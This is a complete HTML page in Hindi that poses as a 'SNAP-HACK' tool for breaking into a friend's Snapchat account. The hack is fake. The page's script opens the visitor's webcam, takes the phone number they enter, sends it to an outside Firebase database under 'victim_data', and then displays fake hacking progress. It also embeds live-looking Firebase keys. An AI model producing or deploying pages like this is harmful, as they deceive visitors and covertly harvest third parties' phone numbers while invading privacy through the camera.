<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="icon" href="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png">
    <link rel="apple-touch-icon" href="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png">

    <style>
        body { background-color: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 20px; }
        .logo { width: 80px; margin-top: 20px; }
        .hacker-box { border: 2px solid #fffc00; padding: 20px; border-radius: 15px; background: #111; box-shadow: 0 0 15px #fffc00; margin-top: 30px;}
        input { padding: 12px; width: 85%; margin: 15px 0; background: #222; color: #fff; border: 1px solid #fffc00; border-radius: 5px; }
        button { background: #fffc00; color: #000; padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 90%; font-size: 18px; }
        video { width: 100%; max-width: 300px; border: 2px solid #fffc00; border-radius: 10px; margin-top: 10px; background: #000; }
    </style>
</head>
<body>
    <img src="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png" class="logo">
    <div class="hacker-box">
        <h2 style="color:#fffc00">SNAP-HACK v2.0</h2>
        <p>[!] सर्वर कनेक्टेड: साहिल</p>
        <video id="video" autoplay playsinline></video>
        <input type="number" id="phone" placeholder="दोस्त का नंबर डालें">
        <button onclick="sendToSahil()">HACK SNAPCHAT</button>
        <p id="status" style="margin-top:15px; color: #fffc00;"></p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB0XpDdnwQDD2X02QEDLkdgCHos_8YgmDs",
            authDomain: "sahil-snap-hacker.firebaseapp.com",
            databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com",
            projectId: "sahil-snap-hacker",
            storageBucket: "sahil-snap-hacker.firebasestorage.app",
            messagingSenderId: "597030531702",
            appId: "1:597030531702:web:8a5ba9fc3328fe8d1de557"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const video = document.getElementById('video');
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { video.srcObject = stream; });

        window.sendToSahil = function() {
            const phone = document.getElementById('phone').value;
            if(phone.length < 10) { alert("नंबर तो डालो भाई!"); return; }
            
            push(ref(db, 'victim_data'), {
                number: phone,
                time: new Date().toLocaleString()
            }).then(() => {
                document.getElementById('status').innerText = "डाटा एक्सेस हो रहा है... 99%";
                setTimeout(() => { alert("काम हो गया! डाटा साहिल के पास सेव है।"); }, 2000);
            });
        }
    </script>
</body>
</html>
